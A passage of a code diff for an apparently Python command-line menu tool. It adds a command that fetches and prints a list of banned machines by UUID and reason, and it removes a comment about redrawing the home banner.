+                        print(f"{Colors.RED}[!] Unban failed: {resp}{Colors.RESET}")
+            elif selection_target == "banned":
+                resp = _admin_request("list", "")
+                if resp and isinstance(resp, dict):
+                    banned = resp.get("banned", [])
+                    if not banned:
+                        print(f"{Colors.CYAN}[*] No banned machines.{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[!] Banned machines:{Colors.RESET}")
+                        for entry in banned:
+                            print(f"  - {entry.get('uuid')} | {entry.get('reason', 'N/A')}")
+                else:
+                    print(f"{Colors.RED}[!] Failed to fetch banned list.{Colors.RESET}")
             elif selection_target in ("1", "2", "3", "4", "5"):
                 handle_category_deck(selection_target)
-                # Wipe the submenu buffer and redraw the active theme banner on the
-                # way back to the main directory so the UI stays visible.
                 _render_home()
             else:
                 print(f"Command '{selection_target}' not found. Type 'help' for options.\n")
